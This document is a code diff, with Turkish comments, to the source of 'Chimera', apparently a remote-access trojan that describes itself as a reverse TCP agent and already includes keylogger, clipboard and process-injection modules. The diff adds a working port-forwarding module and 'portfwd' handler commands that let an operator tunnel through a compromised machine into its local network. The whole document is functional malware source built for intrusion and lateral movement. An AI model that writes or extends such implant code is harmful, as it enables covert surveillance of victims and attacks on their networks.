@@ -738,6 +738,148 @@ class ClipboardManager:
             except:
                 return False
 
+# ============================================================
+# Port Forwarding (Tünelleme) Modülü
+# ============================================================
+class PortForwarder:
+    """Agent tarafında port forwarding (tünel) yöneticisi.
+    
+    Local Port Forwarding mantığı:
+    - Agent üzerinde bir dinleyici soket açılır (bind_host:bind_port).
+    - Handler'dan "portfwd add" komutu geldiğinde agent yerel ağındaki hedef
+      adrese (remote_host:remote_port) bir tünel oluşturur.
+    - Gelen her bağlantı için iki yönlü (bidirectional) relay thread'leri başlatılır.
+    """
+
+    def __init__(self):
+        self._tunnels = {}      # id -> {"thread", "server_sock", "stop_event", "info"}
+        self._next_id = 1
+        self._lock = threading.Lock()
+
+    # ----------------------------------------------------------
+    def add(self, bind_host: str, bind_port: int,
+            remote_host: str, remote_port: int) -> str:
+        """Yeni bir port forwarding tüneli başlatır."""
+        try:
+            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_sock.bind((bind_host, bind_port))
+            server_sock.listen(5)
+            server_sock.settimeout(1.0)   # accept() timeout (stop kontrolü için)
+        except Exception as e:
+            return f"[!] Port forwarding başlatılamadı ({bind_host}:{bind_port}): {e}"
+
+        stop_event = threading.Event()
+        tunnel_id = self._next_id
+
+        def _relay(src: socket.socket, dst: socket.socket, ev: threading.Event):
+            """İki soket arasında tek yönlü veri aktarır."""
+            try:
+                while not ev.is_set():
+                    try:
+                        src.settimeout(1.0)
+                        data = src.recv(4096)
+                        if not data:
+                            break
+                        dst.sendall(data)
+                    except socket.timeout:
+                        continue
+                    except Exception:
+                        break
+            finally:
+                try: src.close()
+                except: pass
+                try: dst.close()
+                except: pass
+
+        def _accept_loop():
+            """Gelen bağlantıları kabul eder ve relay thread'lerini oluşturur."""
+            while not stop_event.is_set():
+                try:
+                    client_conn, _ = server_sock.accept()
+                except socket.timeout:
+                    continue
+                except Exception:
+                    break
+
+                # Hedef adrese bağlan
+                try:
+                    remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    remote_sock.settimeout(10)
+                    remote_sock.connect((remote_host, remote_port))
+                except Exception:
+                    try: client_conn.close()
+                    except: pass
+                    continue
+
+                # Çift yönlü relay
+                t1 = threading.Thread(target=_relay, args=(client_conn, remote_sock, stop_event), daemon=True)
+                t2 = threading.Thread(target=_relay, args=(remote_sock, client_conn, stop_event), daemon=True)
+                t1.start()
+                t2.start()
+
+            # Temizlik
+            try: server_sock.close()
+            except: pass
+
+        t = threading.Thread(target=_accept_loop, daemon=True)
+        t.start()
+
+        info = {
+            "thread": t,
+            "server_sock": server_sock,
+            "stop_event": stop_event,
+            "info": f"{bind_host}:{bind_port} -> {remote_host}:{remote_port}",
+        }
+
+        with self._lock:
+            self._tunnels[tunnel_id] = info
+            self._next_id += 1
+
+        return (
+            f"[+] Port forwarding başlatıldı (ID {tunnel_id}): "
+            f"{bind_host}:{bind_port} → {remote_host}:{remote_port}"
+        )
+
+    # ----------------------------------------------------------
+    def remove(self, tunnel_id: int) -> str:
+        """Belirtilen ID'ye sahip tüneli durdurur ve temizler."""
+        with self._lock:
+            if tunnel_id not in self._tunnels:
+                return f"[!] Tünel #{tunnel_id} bulunamadı."
+            tunnel = self._tunnels.pop(tunnel_id)
+
+        tunnel["stop_event"].set()
+        try: tunnel["server_sock"].close()
+        except: pass
+        return f"[+] Port forwarding #{tunnel_id} kaldırıldı."
+
+    # ----------------------------------------------------------
+    def list_tunnels(self) -> str:
+        """Aktif tünelleri listeler."""
+        with self._lock:
+            if not self._tunnels:
+                return "[-] Aktif port forwarding tüneli yok."
+            lines = ["[*] Aktif Port Forwarding Tünelleri:"]
+            lines.append(f"  {'ID':<6}{'Tünel':<40}{'Durum':<10}")
+            lines.append("  " + "-" * 54)
+            for tid, t in self._tunnels.items():
+                status = "Aktif" if t["thread"].is_alive() else "Durduruldu"
+                lines.append(f"  {tid:<6}{t['info']:<40}{status:<10}")
+            return "\n".join(lines)
+
+    # ----------------------------------------------------------
+    def stop_all(self) -> str:
+        """Tüm tünelleri durdurur."""
+        with self._lock:
+            ids = list(self._tunnels.keys())
+        if not ids:
+            return "[-] Aktif tünel yok."
+        for tid in ids:
+            self.remove(tid)
+        return f"[+] {len(ids)} tünel durduruldu."
+
+
 class ChimeraAgent:
 
     """Chimera Core Agent - Temel reverse TCP ajanı."""
@@ -748,9 +890,10 @@ class ChimeraAgent:
         self.sock = None
         self.running = True
         self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
-        self.keylogger  = Keylogger()          # Keylogger modülü
-        self.clipboard  = ClipboardManager()    # Clipboard modülü
-        self.injector   = ProcessInjector()     # Process Injection modülü
+        self.keylogger      = Keylogger()          # Keylogger modülü
+        self.clipboard      = ClipboardManager()    # Clipboard modülü
+        self.injector       = ProcessInjector()     # Process Injection modülü
+        self.port_forwarder = PortForwarder()       # Port Forwarding modülü
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -2103,6 +2246,57 @@ class ChimeraAgent:
                     return "[!] Pano içeriği değiştirilemedi."
             except Exception as e:
                 return f"[!] Pano yazma hatası: {str(e)}"
+
+        # ── Port Forwarding (Faz 6.1) ────────────────────────────
+        if cmd_lower.startswith("portfwd "):
+            try:
+                pf_parts = cmd.strip().split()
+                sub_cmd  = pf_parts[1].lower() if len(pf_parts) > 1 else ""
+
+                if sub_cmd == "add":
+                    # portfwd add -L <bind> -r <remote> -p <port>
+                    bind_port = 0
+                    remote_host = ""
+                    remote_port = 0
+                    bind_host = "127.0.0.1"
+                    
+                    for i, part in enumerate(pf_parts):
+                        if part.lower() == "-l" and i + 1 < len(pf_parts):
+                            bind_port = int(pf_parts[i+1])
+                        elif part.lower() == "-r" and i + 1 < len(pf_parts):
+                            remote_host = pf_parts[i+1]
+                        elif part.lower() == "-p" and i + 1 < len(pf_parts):
+                            remote_port = int(pf_parts[i+1])
+                            
+                    if not bind_port or not remote_host or not remote_port:
+                        return "[!] Kullanım: portfwd add -L <bind_port> -r <remote_host> -p <remote_port>"
+                        
+                    return self.port_forwarder.add(bind_host, bind_port, remote_host, remote_port)
+
+                elif sub_cmd == "del":
+                    if len(pf_parts) < 3:
+                        return "[!] Kullanım: portfwd del <id>"
+                    tunnel_id = int(pf_parts[2])
+                    return self.port_forwarder.remove(tunnel_id)
+
+                elif sub_cmd == "list":
+                    return self.port_forwarder.list_tunnels()
+
+                elif sub_cmd == "stop":
+                    return self.port_forwarder.stop_all()
+
+                else:
+                    return (
+                        "[!] Geçersiz alt komut. Kullanım:\n"
+                        "    portfwd add -L <bind_port> -r <remote_host> -p <remote_port>\n"
+                        "    portfwd list\n"
+                        "    portfwd del <id>\n"
+                        "    portfwd stop"
+                    )
+            except ValueError as e:
+                return f"[!] Geçersiz parametre formatı: {e}"
+            except Exception as e:
+                return f"[!] Port forwarding hatası: {e}"
 
         # Özel komutlar - Shell
         if cmd_lower == "shell":
